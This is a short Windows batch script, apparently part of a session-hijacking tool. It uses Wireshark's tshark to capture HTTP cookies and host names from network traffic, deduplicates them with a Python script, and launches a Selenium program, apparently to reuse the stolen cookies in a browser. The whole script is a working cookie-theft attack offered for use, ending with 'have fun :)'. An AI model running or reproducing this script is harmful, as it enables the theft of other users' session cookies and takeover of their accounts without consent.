@echo off
set /p sec="Enter the amount of sec you want to scan : "
start "TSharkByWPPTHacker" /B "C:\Program Files\Wireshark\tshark.exe" "-q" "-i" "2" "-Y" "http.cookie" "-T" "fields" "-e" "http.host" "-e" "http.cookie" "-a" "duration:%sec%" > data.txt
echo. 
echo Fetching data...
echo.
set /A sec=%sec%+7
timeout /t %sec%

echo. 
echo Get uniqueData...
start "" "py" "uniqueData.py"
timeout /t 5

echo. 
echo Running selenium, have fun :)
start "" /B "java" "-jar" "Catch.jar"

pause
taskkill /IM geckodriver.exe /f

